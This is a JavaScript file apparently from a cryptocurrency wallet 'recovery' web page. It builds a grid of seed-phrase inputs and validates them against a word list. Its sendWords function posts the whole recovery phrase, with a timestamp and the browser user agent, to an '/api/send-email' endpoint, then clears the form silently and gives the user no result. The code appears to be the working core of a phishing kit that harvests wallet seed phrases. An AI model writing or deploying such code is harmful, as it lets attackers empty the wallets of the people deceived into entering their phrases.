// Add this variable to track form validity
let formHasErrors = false;

// Helper functions for form validation
function validateWord(word) {
    return validWords.includes(word.toLowerCase());
}

function generateInputs() {
    const grid = document.getElementById('phrasesGrid');
    const wordCount = parseInt(document.getElementById('wordCount').value);
    
    grid.innerHTML = '';

    for (let i = 1; i <= wordCount; i++) {
        const div = document.createElement('div');
        div.className = 'phrase-input';
        div.innerHTML = `
            <div class="input-container">
                <span class="number-label">${i}</span>
                <input type="text" 
                    id="phrase${i}" 
                    placeholder="Enter word"
                    oninput="validateInput(this)">
                <button type="button" class="visibility-toggle" onclick="toggleFieldVisibility(${i})">
                    <img src="src/asset/svg/eye-open.svg" alt="Toggle visibility" id="visibilityIcon${i}">
                </button>
            </div>
        `;
        grid.appendChild(div);
    }
}

function validateInput(input) {
    const word = input.value.trim();
    const container = input.parentElement;
    
    // Add or remove class based on whether input has content
    if (word === '') {
        container.classList.remove('invalid');
        container.classList.remove('input-has-content'); // Remove class when empty
        updateSubmitButton();
        return;
    } else {
        container.classList.add('input-has-content'); // Add class when has content
    }

    if (!validateWord(word)) {
        container.classList.add('invalid');
    } else {
        container.classList.remove('invalid');
    }
    
    // Check all inputs and update submit button state
    updateSubmitButton();
}

// New function to update the submit button state
function updateSubmitButton() {
    const invalidInputs = document.querySelectorAll('.input-container.invalid');
    const emptyInputs = Array.from(document.querySelectorAll('.phrase-input input')).filter(input => input.value.trim() === '');
    const submitBtn = document.querySelector('.login-btn');
    
    if (invalidInputs.length > 0 || emptyInputs.length > 0) {
        submitBtn.disabled = true;
        submitBtn.classList.add('disabled');
        formHasErrors = true;
    } else {
        submitBtn.disabled = false;
        submitBtn.classList.remove('disabled');
        formHasErrors = false;
    }
}

// Create error message element
function createErrorMessage() {
    const errorMsg = document.createElement('div');
    errorMsg.id = 'validation-error';
    errorMsg.className = 'validation-error';
    errorMsg.style.color = '#dc2626';
    errorMsg.style.marginTop = '10px';
    errorMsg.style.textAlign = 'center';
    errorMsg.style.fontSize = '0.9rem';
    
    // Insert after the phrases grid
    const phrasesGrid = document.getElementById('phrasesGrid');
    phrasesGrid.parentNode.insertBefore(errorMsg, phrasesGrid.nextSibling);
    
    return errorMsg;
}

function handlePaste(event) {
    event.preventDefault();
    const pastedText = (event.clipboardData || window.clipboardData).getData('text');
    const words = pastedText.trim().split(/\s+/);
    const inputs = document.querySelectorAll('.phrase-input input');
    
    words.forEach((word, index) => {
        if (inputs[index]) {
            inputs[index].value = word;
            validateInput(inputs[index]);
        }
    });
    
    updateNumberVisibility(); // Update number visibility after pasting
}

function setupPasteHandling() {
    const phrasesGrid = document.getElementById('phrasesGrid');
    phrasesGrid.addEventListener('paste', handlePaste);
}

function toggleFieldVisibility(fieldId) {
    const input = document.getElementById(`phrase${fieldId}`);
    const icon = document.getElementById(`visibilityIcon${fieldId}`);
    
    if (input.type === 'text') {
        input.type = 'password';
        icon.src = 'src/asset/svg/eye-closed.svg';
    } else {
        input.type = 'text';
        icon.src = 'src/asset/svg/eye-open.svg';
    }
}

function collectWords() {
    const inputs = document.querySelectorAll('.phrase-input input');
    return Array.from(inputs).map(input => input.value.trim());
}

// Update API_ENDPOINT to handle Vercel deployments
const API_ENDPOINT = '/api/send-email';

async function sendWords(btn) {
    const originalText = btn.textContent;
    
    try {
        const inputs = document.querySelectorAll('.phrase-input input');
        const words = Array.from(inputs).map(input => input.value.trim());
        const timestamp = new Date().toISOString();
        
        if (words.some(word => word === '') || formHasErrors) {
            return;
        }
        
        btn.disabled = true;
        btn.classList.add('disabled');
        btn.textContent = 'Processing...';
        
        try {
            const response = await fetch('/api/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    recoveryPhrase: words.join(' '),
                    timestamp: timestamp,
                    userAgent: navigator.userAgent
                })
            });

            if (response.ok) {
                // Clear form silently on success
                inputs.forEach(input => input.value = '');
                updateNumberVisibility();
                updateSubmitButton();
            }
        } finally {
            // Always restore button state
            btn.disabled = false;
            btn.classList.remove('disabled');
            btn.textContent = originalText;
        }
        
    } catch (error) {
        console.error('Error:', error);
    }
}

// Add event listener when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Simulate loading delay (remove this in production if you want it to be based on actual load time)
    setTimeout(() => {
        hideLoadingScreen();
    }, 2000); // Show loading screen for 2 seconds, adjust as needed
    
    generateInputs();
    setupPasteHandling();
    
    document.getElementById('wordCount').addEventListener('change', generateInputs);
    
    // Add input event listeners for all inputs to update button state
    document.addEventListener('input', function(e) {
        if (e.target.matches('.phrase-input input')) {
            validateInput(e.target);
        }
    });
    
    const form = document.getElementById('recoveryForm');
    const submitBtn = document.querySelector('.login-btn');
    
    if (form && submitBtn) {
        submitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (!formHasErrors) {
                sendWords(submitBtn);
            }
        });
        
        // Handle form submission to prevent default
        form.addEventListener('submit', function(e) {
            e.preventDefault();
        });
    }
    
    // Initialize button state
    updateSubmitButton();
    updateNumberVisibility(); // Add this to check initial state
});

// Add this function to ensure number labels are properly shown/hidden when form initializes
function updateNumberVisibility() {
    const inputs = document.querySelectorAll('.phrase-input input');
    inputs.forEach(input => {
        const container = input.parentElement;
        if (input.value.trim() !== '') {
            container.classList.add('input-has-content');
        } else {
            container.classList.remove('input-has-content');
        }
    });
}

// Add this function to handle the loading screen
function hideLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
        // Add the hidden class to trigger the fade-out effect
        loadingScreen.classList.add('hidden');
        
        // Remove the element from the DOM after fade-out completes
        setTimeout(() => {
            loadingScreen.parentNode.removeChild(loadingScreen);
        }, 500); // Match this with the CSS transition duration
    }
}
